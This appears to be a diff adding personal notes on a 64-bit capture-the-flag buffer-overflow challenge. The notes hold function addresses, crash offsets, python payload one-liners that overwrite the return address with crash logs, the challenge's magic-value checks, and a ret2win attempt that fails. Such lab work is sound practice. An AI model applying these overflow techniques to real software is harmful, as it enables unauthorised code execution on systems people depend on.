@@ -1,0 +1,84 @@
+00000000004008ce <main>:
+
+00000000004008b2 <vuln>:
+
+000000000040084d <flag>:
+
+00000000004007be <win_fn>:
+
+0000000000400781 <win_fn2>:
+
+0000000000400767 <win_fn1>:
+
+-----
+
+local debug
+
+64-66 = segfault
+67-68 = segfault w/ partial control
+69-70 = segfault w/ control
+71-72 = bus error
+73    = segfault
+74-78 = segfault w/ control
+79    = segfault
+
+
+python -c 'print "a"*69' | ./vuln; dmesg | tail -1
+
+Segmentation fault (core dumped)
+[104917.415961] vuln[5395]: segfault at 6161616161 ip 0000000000400935 sp 00007fffc76b33d0 error 4 in vuln[400000+1000]
+
+
+python -c 'print "a"*74' | ./vuln; dmesg | tail -1
+
+Segmentation fault (core dumped)
+[105144.178171] vuln[5477]: segfault at 6161 ip 0000000000006161 sp 00007ffcfea351c0 error 14 in vuln[400000+1000]
+
+
+python -c 'print "a"*78' | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Can you match these numbers?
+
+[105310.005281] vuln[5556]: segfault at 616161616161 ip 0000616161616161 sp 00007fff54bac290 error 14 in libc-2.23.so[7f7e2412a000+1c0000]
+
+----------
+
+need to set the global boolean variables using functions with parameters
+after the 2 functions then call the 3rd to print the flag after the check
+
+bool win1 = false;
+bool win2 = false;
+
+void win_fn1(unsigned int arg_check) {
+  if (arg_check == 0xDEADBEEF) {
+    win1 = true;
+  }
+}
+
+void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
+  if (win1 && \
+      arg_check1 == 0xBAADCAFE && \
+      arg_check2 == 0xCAFEBABE && \
+      arg_check3 == 0xABADBABE) {
+    win2 = true;
+  }
+}
+
+need to pass arguments to functions not using the stack.
+in x86_64 the first 6 args are passed in registers and copy to locals
+
+mov dword [var_4h], edi     ; arg1
+mov dword [var_8h], esi     ; arg2
+mov dword [var_ch], edx     ; arg3
+
+
+----------
+
+target: win_fn
+
+python -c 'print "a"*72 + "\xbe\x07\x40\x00\x00\x00\x00\x00" ' | ./vuln
+
+Welcome to 64-bit. Can you match these numbers?
+Nope, not quite...
+Segmentation fault (core dumped)
+
+
